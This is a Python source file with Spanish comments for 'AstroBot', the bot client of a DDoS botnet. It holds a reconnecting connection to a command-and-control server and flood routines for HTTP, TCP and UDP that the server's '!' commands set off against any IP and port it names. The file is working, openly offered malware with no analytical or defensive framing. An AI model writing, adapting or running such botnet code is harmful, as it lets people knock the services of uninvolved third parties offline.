#!/usr/bin/env python3
# AstroBot - Cliente para AstroCNC

import socket
import threading
import time
import random

class AstroBot:
    def __init__(self, cnc_ip, cnc_port):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.running = True
    
    def connect(self):
        """Conecta al CNC"""
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.cnc_ip, self.cnc_port))
                print("[*] Conectado al CNC")
                self.listen()
            except Exception as e:
                print(f"[!] Error de conexión: {e}")
                time.sleep(5)
    
    def listen(self):
        """Escucha comandos del CNC"""
        while self.running:
            try:
                data = self.sock.recv(1024).decode().strip()
                if not data:
                    break
                    
                if data == "PING":
                    self.sock.send("PONG".encode())
                elif data.startswith("!"):
                    self.process_command(data)
                    
            except Exception as e:
                print(f"[!] Error de conexión: {e}")
                break
    
    def process_command(self, cmd):
        """Procesa comandos de ataque"""
        parts = cmd.split()
        method = parts[0][1:].upper()
        
        if method == "STOP":
            return
            
        if method in ["HTTP", "TCP", "UDP"] and len(parts) >= 4:
            ip = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
            
            if method == "HTTP":
                path = parts[4] if len(parts) > 4 else "/"
                threading.Thread(target=self.http_flood, args=(ip, port, duration, path)).start()
            elif method == "TCP":
                threading.Thread(target=self.tcp_flood, args=(ip, port, duration)).start()
            elif method == "UDP":
                threading.Thread(target=self.udp_flood, args=(ip, port, duration)).start()
    
    # Métodos de ataque (similares a los del CNC)
    def http_flood(self, ip, port, duration, path="/"):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass
            time.sleep(0.1)
    
    def tcp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.close()
            except:
                pass
            time.sleep(0.1)
    
    def udp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                payload = random._urandom(1024)
                s.sendto(payload, (ip, port))
            except:
                pass
        s.close()

if __name__ == '__main__':
    bot = AstroBot(cnc_ip="127.0.0.1", cnc_port=1337)  # Cambia por la IP de tu CNC
    bot.connect()
